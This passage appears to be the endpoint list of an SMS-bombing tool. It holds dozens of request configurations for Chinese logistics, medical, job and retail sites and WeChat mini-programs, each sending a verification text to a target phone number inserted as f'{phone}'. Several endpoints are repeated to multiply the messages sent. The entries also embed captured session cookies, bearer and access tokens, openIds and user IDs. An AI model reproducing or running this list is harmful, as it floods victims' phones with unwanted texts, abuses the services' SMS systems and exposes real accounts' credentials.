    "appType": "9",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxe564b5e624cb0175/48/page-frame.html"
  }
},
{
  "name": "lutms.com",
  "url": "https://www.lutms.com/wuliu/api/yzm.do",
  "method": "GET",
  "params": {
    "lxdh": f"{phone}"
  },
  "headers": {
    "content-type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx93cd9893c27746d9/94/page-frame.html"
  }
},
{
  "name": "hkf.hengan.com",
  "url": "https://hkf.hengan.com/api/msgs/verification/anno/send",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "codeType": "findUpdatePassword"
  },
  "headers": {
    "Content-Type": "application/json",
    "applet": "1.0.0",
    "token": "",
    "Authorization": "Basic aGFkY19kcml2ZXI6aGFkY19kcml2ZXJfc2VjcmV0",
    "brand": "OnePlus",
    "model": "OPD2404",
    "version": "8.0.63",
    "system": "Android 15",
    "platform": "android",
    "SDKVersion": "3.10.2",
    "openId": "oUpqo66G5ills_pjUhwbmP9weEhU",
    "tenant": "",
    "sub_tenant": "",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxd6bdcdc145224786/18/page-frame.html"
  }
},
{
  "name": "pms.gennergy.com",
  "url": "https://pms.gennergy.com/api/pms/sso/account/sendSms",
  "method": "POST",
  "json_data": {
    "telephone": f"{phone}",
    "businessCode": "login"
  },
  "headers": {
    "Content-Type": "application/json",
    "platform": "mp-weixin",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx8b9ddd58992ee4eb/74/page-frame.html"
  }
},
{
  "name": "kbytms.masterkong.com.cn",
  "url": "https://kbytms.masterkong.com.cn/SCM.Mobile.WebApi/Driver/SendRegisterCheckCodes",
  "method": "POST",
  "params": {
    "phone": f"{phone}",
    "lang": "zh-cn"
  },
  "headers": {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Length": "0",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?0",
    "Origin": "https://kbytms.masterkong.com.cn",
    "X-Requested-With": "com.tencent.mm",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://kbytms.masterkong.com.cn/SCM.DriverMobile.App/registerDriver.html?r=19422",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
  }
},
{
  "name": "sijibao.gangkou56.com",
  "url": "https://sijibao.gangkou56.com/api/sijibao/login/{phone}/verification-code",
  "method": "GET",
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
    "mobile": "waxqs0011722",
    "openid": "",
    "timestamp": "29319278",
    "took": "1d7885569eed88862a4b0cd69a4a8636",
    "driverid": "0",
    "token": "",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wxf693883b97771dac/436/page-frame.html"
  }
},
{
  "name": "zxwl.zhongxuanwulian.com",
  "url": "https://zxwl.zhongxuanwulian.com/driver/account/vcode",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxf9129ab75f58786a/26/page-frame.html",
    "Cookie": "IAS_BOSS__PROD_ID=26e9674a-380c-4b76-bde2-0589d4e90b76"
  }
},
{
  "name": "optimus.huotx56.com",
  "url": "https://optimus.huotx56.com/handler/sendMessage",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "entryName": "kali-driver-wxapp"
  },
  "headers": {
    "Content-Type": "application/json",
    "content-type": "application/json;charset=UTF-8",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "x-xsrf-token": "",
    "authorization": "",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx84c0edecb7f18bdc/192/page-frame.html",
    "Cookie": "XSRF-TOKEN="
  }
},
{
  "name": "ntp.tlrywl.com",
  "url": "https://ntp.tlrywl.com/api/sys/sms",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "smsmode": 3
  },
  "headers": {
    "Content-Type": "application/json",
    "X-Access-Platform": "DRIVER_APP",
    "X-Access-System": "ANDROID",
    "X-Access-DeviceType": "MP-WEIXIN",
    "X-Access-Token": "",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx610a79a8fb180136/29/page-frame.html"
  }
},
{
  "name": "mini-tms.spxsgs.com",
  "url": "https://mini-tms.spxsgs.com/shell/phoneManager/sendCaptcha",
  "method": "POST",
  "data": {
    "phone": f"{phone}"
  },
  "headers": {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "sec-ch-ua-platform": "\"Android\"",
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?0",
    "Origin": "https://mini-tms.spxsgs.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://mini-tms.spxsgs.com/shell/LOGIN0001/?t=1759158608028&jsCode=0b1sCjll24Tbng435Fkl2Ypxug1sCjln&platform=android&homePage=/public/tms/html/index/index&phone=&returnToUrl=&pageMap=&plugin=jsApi,swsUI,charts&shareScene=",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": "SESSION=NzJkMTljM2UtZTAxNS00ZjNlLThlMmItNTkzYjZmMjgzNjEw"
  }
},
{
  "name": "gateway.yytkeji.com",
  "url": "https://gateway.yytkeji.com/account/account/send/verify_code_login",
  "method": "POST",
  "data": {
    "mobilePhone": f"{phone}"
  },
  "headers": {
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wxcd7b61014b73b8c1/141/page-frame.html",
    "Cookie": "JSESSIONID="
  }
},
{
  "name": "drewture.com",
  "url": "https://www.drewture.com/wlhyapi/getSmsCode",
  "method": "POST",
  "data": {
    "mobile": f"{phone}",
    "productKey": "weapp-wlhy-vhc",
    "session3rd": "4aebbc5c-b67d-4ede-9ef5-7a7d2fd32212"
  },
  "headers": {
    "product": "app-wlhy-vhc",
    "imei": "ss-1b2b0635-cfc8-450d-afae-7e3993896eed",
    "osVersion": "wechart-OPD2404",
    "ip": "111.38.169.240",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx1a10825c269e65af/16/page-frame.html",
    "Cookie": "SHAREJSESSIONID=ss-1b2b0635-cfc8-450d-afae-7e3993896eed"
  }
},
{
  "name": "gy.huajichen.com",
  "url": "https://gy.huajichen.com/tms/app/sms/sendAliCode",
  "method": "GET",
  "params": {
    "phone": f"{phone}"
  },
  "headers": {
    "tenant-id": "1",
    "content-type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxda16f31907fb9891/52/page-frame.html"
  }
},
{
  "name": "api.app.bmsgps.com",
  "url": "https://api.app.bmsgps.com/new_energy/server/api/web/",
  "method": "GET",
  "params": {
    "r": "user/verify-code",
    "appid": "wxf131ac2677d79319",
    "phone": f"{phone}",
    "token": "",
    "v": "4.1.2024032701"
  },
  "headers": {
    "content-type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxf131ac2677d79319/5/page-frame.html"
  }
},
{
  "name": "m.hylszsh.com",
  "url": "https://m.hylszsh.com/Json/JsonVCode",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "smsType": "1"
  },
  "headers": {
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "sec-ch-ua-platform": "\"Android\"",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://m.hylszsh.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://m.hylszsh.com/account/reg/0",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i",
    "Cookie": "ASP.NET_SessionId=vr04nfdp4a5jyj4jy1m4d1or; ydsh_cookie_app_id=wx09bb65829f88cabb"
  }
},
{
  "name": "haoyunlai.logcqyz.cn",
  "url": "https://haoyunlai.logcqyz.cn/UserController/getSMSCode",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "timestamp": 1759176142225,
    "sign": "f7fdd428dc78cf5e289ecdaa7f3f9c70"
  },
  "headers": {
    "Content-Type": "application/json",
    "token": "[object Null]",
    "content-type": "application/json;charset=UTF-8",
    "referType": "WECHAT",
    "X-API-VERSION": "v20250928",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx69b66ba8fbfdb2ea/228/page-frame.html",
    "Cookie": "JSESSIONID="
  }
},
{
  "name": "zcclient.uqbike.com",
  "url": "https://zcclient.uqbike.com/customer/login/sms",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "appId": "wx17bc8165f515ccf9",
    "wxLoginCode": "0d1iH50w3ARvI53tPS1w3xPwSo2iH50v",
    "loginType": 1,
    "timestamp": 1759176252784,
    "decryptStr": "79a2156d36fe5242e53eafacfd4ebbe2"
  },
  "headers": {
    "Content-Type": "application/json",
    "token": "",
    "appid": "wx17bc8165f515ccf9",
    "appversion": "20241230",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx17bc8165f515ccf9/30/page-frame.html"
  }
},
{
  "name": "gw.yichekeji.com",
  "url": "https://gw.yichekeji.com/driver-ma-api/login/sendVc",
  "method": "GET",
  "params": {
    "mobile": f"{phone}"
  },
  "headers": {
    "content-type": "application/json;charset=UTF-8",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx71e54ff100f5cfa2/12/page-frame.html"
  }
},
{
  "name": "hytx.tjcyfz.com",
  "url": "https://hytx.tjcyfz.com/mall-portal/v2/sms/notverify/sendSMS",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "accessToken": "8e61ffe89d234185adce156f4526e352",
    "MemberToken": "member_token:c2f404aa708244bf80ed8bf17f7c558f",
    "renantId": "9ee867543c2c4bd8a765a965194fbfbb",
    "appId": "wxedb68a00bc5f2187",
    "mallId": "880ecdd7b7ba4e4fbd9c11a75927a14c",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxedb68a00bc5f2187/23/page-frame.html"
  }
},
{
  "name": "zhihuiduanbo.com",
  "url": "https://www.zhihuiduanbo.com/api/sms/send",
  "method": "POST",
  "data": {
    "mobile": f"{phone}",
    "event": "mobilelogin",
    "token": ""
  },
  "headers": {
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx90ca342ccf653837/25/page-frame.html"
  }
},
{
  "name": "api.qmyszkj.com",
  "url": "https://api.qmyszkj.com:9000/freight/driver/sendRegisterMsgCode",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "Host": "api.qmyszkj.com:9000",
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx6f4af3d2e3894abb/31/page-frame.html"
  }
},
{
  "name": "umop.shenghui56.com",
  "url": "https://umop.shenghui56.com:8086/self-prod/selfmachine-auth/customer/verify",
  "method": "GET",
  "params": {
    "phone": f"{phone}",
    "isFromSign": "true"
  },
  "headers": {
    "Host": "umop.shenghui56.com:8086",
    "content-type": "application/json",
    "Authorization": "",
    "showLoading": "[object Boolean]",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx9442b892c0a127bf/31/page-frame.html"
  }
},
{
  "name": "eshangu.56qqt.net",
  "url": "https://eshangu.56qqt.net/sms/verify-code",
  "method": "GET",
  "params": {
    "phone": f"{phone}",
    "minutes": "3"
  },
  "headers": {
    "content-type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxefd1da20ff6182d0/380/page-frame.html"
  }
},
{
  "name": "wuliu.gn580.com",
  "url": "https://wuliu.gn580.com/gateway/wx/gn_applet/api/loginController/getVerifyCode",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxdd0543c5b69fdf23/62/page-frame.html"
  }
},
{
  "name": "wx.dslyy.com",
  "url": "https://wx.dslyy.com/api/v1/mc-applet/wxMemberInfo/sendCaptcha",
  "method": "POST",
  "params": {
    "mini_token": "2_E8A8DB0315AF491CB91CC46D72D0F148"
  },
  "json_data": {
    "memberId": "1-2943773205",
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx16ed9a8bbb188228/961/page-frame.html"
  }
},
{
  "name": "wx.dslyy.com",
  "url": "https://wx.dslyy.com/api/v1/mc-applet/wxMemberInfo/sendCaptcha",
  "method": "POST",
  "params": {
    "mini_token": "2_E8A8DB0315AF491CB91CC46D72D0F148"
  },
  "json_data": {
    "memberId": "1-2943773205",
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx16ed9a8bbb188228/961/page-frame.html"
  }
},
{
  "name": "wx.dslyy.com",
  "url": "https://wx.dslyy.com/api/v1/mc-applet/wxMemberInfo/sendCaptcha",
  "method": "POST",
  "params": {
    "mini_token": "2_E8A8DB0315AF491CB91CC46D72D0F148"
  },
  "json_data": {
    "memberId": "1-2943773205",
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx16ed9a8bbb188228/961/page-frame.html"
  }
},
{
  "name": "wx.dslyy.com",
  "url": "https://wx.dslyy.com/api/v1/mc-applet/wxMemberInfo/sendCaptcha",
  "method": "POST",
  "params": {
    "mini_token": "2_E8A8DB0315AF491CB91CC46D72D0F148"
  },
  "json_data": {
    "memberId": "1-2943773205",
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx16ed9a8bbb188228/961/page-frame.html"
  }
},
{
  "name": "wx.dslyy.com",
  "url": "https://wx.dslyy.com/api/v1/mc-applet/wxMemberInfo/sendCaptcha",
  "method": "POST",
  "params": {
    "mini_token": "2_E8A8DB0315AF491CB91CC46D72D0F148"
  },
  "json_data": {
    "memberId": "1-2943773205",
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx16ed9a8bbb188228/961/page-frame.html"
  }
},
{
  "name": "hlw.gyey.com",
  "url": "https://hlw.gyey.com/med/gateway/100073/ytGateway",
  "method": "POST",
  "data": {
    "api_name": "/r/10001/103@udb3",
    "phoneNo": f"{phone}"
  },
  "headers": {
    "SRType": "wechat",
    "SRKey": "gyey",
    "X-Requested-With": "XMLHttpRequest",
    "X-WX-Model": "OPD2404",
    "yt-h5url": "/packages/login_with_phone/index",
    "version": "101.3.12",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxbc9d7d23b34a97ac/15/page-frame.html",
    "Cookie": "connect.sid=s:DQTMh18XKx4Rx8iBE6y4dvl0XqvMbZ4D.MDAok3wl6cT8bVf%2FKr5wJWTYUWvKqvEtMvRBsj2bxE4"
  }
},
{
  "name": "pub.yaofangwang.com",
  "url": "https://pub.yaofangwang.com/4000/4000/0/guest.account.sendSMS",
  "method": "GET",
  "params": {
    "mobile": f"{phone}",
    "type": "1",
    "get_from": "wx_miniapp_1",
    "__client": "app_wx",
    "app_version": "7.1.59",
    "osVersion": "miniapp",
    "deviceName": "OPD2404",
    "os": "android",
    "version": "8.0.63",
    "market": "OnePlus",
    "networkType": "true",
    "lat": "31.221140483329414",
    "lng": "121.54408972227351",
    "user_city_name": "上海市",
    "user_region_id": "",
    "idfa": "wx_0e1Y0WZv3PVNI53p184w3mWmrZ0Y0WZZ",
    "device_no": "wx_0e1Y0WZv3PVNI53p184w3mWmrZ0Y0WZZ"
  },
  "headers": {
    "content-type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx22c626a6d6d0f593/230/page-frame.html",
    "Cookie": ""
  }
},
{
  "name": "h5-health.tengmed.com",
  "url": "https://h5-health.tengmed.com/api/gateway/ChannelProxyServer/sendSmsVerifyCode",
  "method": "POST",
  "json_data": {
    "args": {
      "commonIn": {
        "requestId": "5d71d8e4-9023-4126-9da4-398a7edd2e13",
        "userAppId": "wx6a3b316b0201341f",
        "appId": "wxee969de81bba9a45",
        "miniId": "wxee969de81bba9a45",
        "sourceType": 1002,
        "adtag": "plugin",
        "version": "3.16.0"
      },
      "req": {
        "phone": f"{phone}"
      }
    },
    "context": {},
    "service": "ChannelProxyServer",
    "func": "sendSmsVerifyCode"
  },
  "headers": {
    "Content-Type": "application/json",
    "appid": "wxee969de81bba9a45",
    "authtype": "tencent-health-mini",
    "businessid": "tencent-health-mini",
    "request": "5d71d8e4-9023-4126-9da4-398a7edd2e13",
    "trace": "5d71d8e4-9023-4126-9da4-398a7edd2e13",
    "sub-businessid": "plugin_mini",
    "sessionid": "ng1li1759344035260ioG1ZiO8sdKydzTrUMtPD3FTrbwc66a94a0-wx",
    "X-WECHAT-HOSTSIGN": "{\"noncestr\":\"866c5b48408181f91aa9420e5532407b\",\"timestamp\":1759343950,\"signature\":\"2e266b04b862e8bc37ed93621fddeea1c8774496\"}",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx6a3b316b0201341f/166/page-frame.html"
  }
},
{
  "name": "h5-health.tengmed.com",
  "url": "https://h5-health.tengmed.com/api/gateway/ChannelProxyServer/sendSmsVerifyCode",
  "method": "POST",
  "json_data": {
    "args": {
      "commonIn": {
        "requestId": "8e42798d-bbd7-429c-be28-6ac4f68cd3f7",
        "userAppId": "wx410c75320eee6c2b",
        "appId": "wxee969de81bba9a45",
        "miniId": "wxee969de81bba9a45",
        "sourceType": 1002,
        "adtag": "plugin",
        "version": "3.55.0",
        "sourceVersion": "3.55.0"
      },
      "req": {
        "phone": f"{phone}"
      }
    },
    "context": {},
    "service": "ChannelProxyServer",
    "func": "sendSmsVerifyCode"
  },
  "headers": {
    "Content-Type": "application/json",
    "appid": "wxee969de81bba9a45",
    "authtype": "tencent-health-mini",
    "businessid": "tencent-health-mini",
    "request": "8e42798d-bbd7-429c-be28-6ac4f68cd3f7",
    "trace": "8e42798d-bbd7-429c-be28-6ac4f68cd3f7",
    "sub-businessid": "plugin_mini",
    "sessionid": "ng1li1759344439483Dl6ECs0FZOEDguJp1Qliaca7U7E14afa82c-wx",
    "X-WECHAT-HOSTSIGN": "{\"noncestr\":\"708e0645ebcc5600eee594f72746de37\",\"timestamp\":1759344345,\"signature\":\"04af3b27bb42764b006df73a8a769b32fadd17e5\"}",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx410c75320eee6c2b/8/page-frame.html"
  }
},
{
  "name": "api.hdwryy.com",
  "url": "https://api.hdwryy.com:4430/app/sendSmsCode",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "Host": "api.hdwryy.com:4430",
    "Content-Type": "application/json",
    "Authorization": "",
    "sign": "0D593E36909F5ABBD482752E90769F19",
    "timestamp": "1759347923296",
    "accessToken": "d54fed26842ca2d75dcc7fe29eb7986d:1573279576:06A06E601DE3F10FACE2A242DA963F0A",
    "openId": "o8JHs5RfAQHVoQnMPC4yYNJTv_EQ",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx42a9b2d78d527e60/68/page-frame.html"
  }
},
{
  "name": "weapp.91160.com",
  "url": "https://weapp.91160.com/user/sendRegisterSms.html",
  "method": "GET",
  "params": {
    "token": "2da08e26e3c6a3d7efd10df71344bc96",
    "user_id": "258636457",
    "user_key": "def0099a78949369cf609a1a7f4328f0HlgOKOrd20251101034653",
    "phone": f"{phone}",
    "type": "bind",
    "captcha": "",
    "cid": "100012084",
    "channelId": "100012084"
  },
  "headers": {
    "content-type": "application/json;charset=UTF-8",
    "traceid": "guahao/account/person/phone_cd267a6b-17dd-4965-9e84-1ba5a7202971-1759348076080",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx41d50f4960b90df8/417/page-frame.html",
    "Cookie": "PHPSESSID=agh9ou5l00t89t7jpv9roi4n16; city_info=a%3A32%3A%7Bs%3A7%3A%22area_id%22%3Bi%3A3172%3Bs%3A6%3A%22areaId%22%3Bi%3A3172%3Bs%3A9%3A%22parent_id%22%3Bi%3A3157%3Bs%3A8%3A%22parentId%22%3Bi%3A3157%3Bs%3A9%3A%22area_name%22%3Bs%3A6%3A%22%E6%BE%84%E8%BF%88%22%3Bs%3A8%3A%22areaName%22%3Bs%3A6%3A%22%E6%BE%84%E8%BF%88%22%3Bs%3A7%3A%22t_level%22%3Bi%3A100%3Bs%3A6%3A%22tLevel%22%3Bi%3A100%3Bs%3A7%3A%22id_path%22%3Bs%3A12%3A%221%2C3157%2C3172%2C%22%3Bs%3A6%3A%22idPath%22%3Bs%3A12%3A%221%2C3157%2C3172%2C%22%3Bs%3A8%3A%22position%22%3Bi%3A50%3Bs%3A7%3A%22is_used%22%3Bi%3A1%3Bs%3A6%3A%22isUsed%22%3Bi%3A1%3Bs%3A8%3A%22log_stat%22%3Bi%3A0%3Bs%3A7%3A%22logStat%22%3Bi%3A0%3Bs%3A10%3A%22area_level%22%3Bs%3A1%3A%223%22%3Bs%3A9%3A%22areaLevel%22%3Bs%3A1%3A%223%22%3Bs%3A8%3A%22pos_name%22%3Bs%3A6%3A%22%E5%8D%8E%E5%8D%97%22%3Bs%3A7%3A%22posName%22%3Bs%3A6%3A%22%E5%8D%8E%E5%8D%97%22%3Bs%3A3%3A%22hot%22%3Bs%3A1%3A%220%22%3Bs%3A3%3A%22map%22%3Bs%3A20%3A%22110.006754%2C19.738521%22%3Bs%3A9%3A%22area_code%22%3Bs%3A3%3A%22cmx%22%3Bs%3A8%3A%22areaCode%22%3Bs%3A3%3A%22cmx%22%3Bs%3A7%3A%22is_show%22%3Bi%3A1%3Bs%3A6%3A%22isShow%22%3Bi%3A1%3Bs%3A5%3A%22i_key%22%3Bs%3A1%3A%22C%22%3Bs%3A4%3A%22iKey%22%3Bs%3A1%3A%22C%22%3Bs%3A9%3A%22mark_city%22%3Bi%3A0%3Bs%3A8%3A%22markCity%22%3Bi%3A0%3Bs%3A4%3A%22norm%22%3Bs%3A12%3A%22469023000000%22%3Bs%3A8%3A%22unit_sum%22%3Bi%3A9%3Bs%3A7%3A%22unitSum%22%3Bi%3A9%3B%7D; __jsluid_s=332d62db6b38df5af8d84dc3cbfecc4b"
  }
},
{
  "name": "gapi.wsy.com",
  "url": "https://gapi.wsy.com/wxwsy/v1/user/send-sms",
  "method": "POST",
  "data": {
    "phone": f"{phone}"
  },
  "headers": {
    "_terminal_": "wx",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wxb926c385a54cfd20/64/page-frame.html"
  }
},
{
  "name": "appaceso.zryhyy.com.cn",
  "url": "https://appaceso.zryhyy.com.cn/api/mobile/patient/update/phone/code/send?patientCode=f7ca118d919c5b2c3621f5fabe719b12",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "verifyCodeType": "PATIENT_NEW_PHONE_VERIFY"
  },
  "headers": {
    "Content-Type": "application/json",
    "content-type": "application/json;charset=UTF-8",
    "a-ticket": "XQRDLAXU4kCqgLJA0kxVGFFeM3ThmZ1-zZd9nGBNlyvQBnwoNCDPqHm9pNjFVHN1gyTjLKfXwlMwbTugHezGP_6zkxoYueXi0QEUpjQJA7Y.",
    "hos-code": "01110002",
    "u-u-ticket": "bSq653S7LanX525YB80-YTaw8FuqITZT4_h_Wrak0mnIuXEL9Q9AhJB2w6Vimj1dMtHtrQ..",
    "r-a-token": "",
    "client-channel": "WECHAT_MP",
    "app-code": "01110002_HUANZHEDUAN",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx869a0e459663d82a/146/page-frame.html"
  }
},
{
  "name": "mcpwxp.motherchildren.com",
  "url": "https://mcpwxp.motherchildren.com/cloud/ppclient/msg/getauthcode",
  "method": "POST",
  "json_data": {
    "organCode": "HXD2",
    "appCode": "HXFYAPP",
    "channelCode": "PATIENT_WECHAT_APPLET",
    "phoneNum": f"{phone}",
    "busiCode": "hyt_account",
    "tempCode": "normal",
    "clientId": "ooo9znbykh",
    "needCheck": False
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx38285c6799dac2d1/270/page-frame.html"
  }
},
{
  "name": "hbxyjob.cn",
  "url": "https://www.hbxyjob.cn/wsite-web/api/verify",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "type": "register",
    "company": "isCompany"
  },
  "headers": {
    "Content-Type": "application/json",
    "content-type": "application/json;charset=UTF-8",
    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE4NDU3NTIzNTksInVzZXJpZCI6Ijc3Zjc4NjNjOGZlMTQ3ODU5ZjU4NmJjMzA0OGI2YTEwIiwiaWF0IjoxNzU5MzUyMzU5fQ.cRJcVZ8QBvxDocNTarIIX_PQiHFfwDX9UYsIoznCaUE",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxd2182d39c164d339/49/page-frame.html"
  }
},
{
  "name": "ymzp.0633hr.com",
  "url": "https://ymzp.0633hr.com/mobile/insurance/send_code",
  "method": "POST",
  "data": {
    "user_login": f"{phone}",
    "sms_token": "SMS640a23ac0243702f55bdb031db2b9bd7"
  },
  "headers": {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "sec-ch-ua-platform": "\"Android\"",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://ymzp.0633hr.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://ymzp.0633hr.com/mobile/insurance/buy_insure?id=13",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i",
    "Cookie": "PHPSESSID=kqlt8pvalt0k9t02sjahlg0ir0; 13524501748=38ad4cbcf2ded5f78da09b100b0191dc"
  }
},
{
  "name": "ymzp.0633hr.com",
  "url": "https://ymzp.0633hr.com/mobile/insurance/send_code",
  "method": "POST",
  "data": {
    "user_login": f"{phone}",
    "sms_token": "SMS640a23ac0243702f55bdb031db2b9bd7"
  },
  "headers": {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "sec-ch-ua-platform": "\"Android\"",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://ymzp.0633hr.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://ymzp.0633hr.com/mobile/insurance/buy_insure?id=13",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i",
    "Cookie": "PHPSESSID=kqlt8pvalt0k9t02sjahlg0ir0; 13524501748=38ad4cbcf2ded5f78da09b100b0191dc"
  }
},
{
  "name": "ymzp.0633hr.com",
  "url": "https://ymzp.0633hr.com/mobile/insurance/send_code",
  "method": "POST",
  "data": {
    "user_login": f"{phone}",
    "sms_token": "SMS640a23ac0243702f55bdb031db2b9bd7"
  },
  "headers": {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "sec-ch-ua-platform": "\"Android\"",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://ymzp.0633hr.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://ymzp.0633hr.com/mobile/insurance/buy_insure?id=13",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i",
    "Cookie": "PHPSESSID=kqlt8pvalt0k9t02sjahlg0ir0; 13524501748=38ad4cbcf2ded5f78da09b100b0191dc"
  }
},
{
  "name": "ymzp.0633hr.com",
  "url": "https://ymzp.0633hr.com/mobile/insurance/send_code",
  "method": "POST",
  "data": {
    "user_login": f"{phone}",
    "sms_token": "SMS640a23ac0243702f55bdb031db2b9bd7"
  },
  "headers": {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "sec-ch-ua-platform": "\"Android\"",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://ymzp.0633hr.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://ymzp.0633hr.com/mobile/insurance/buy_insure?id=13",
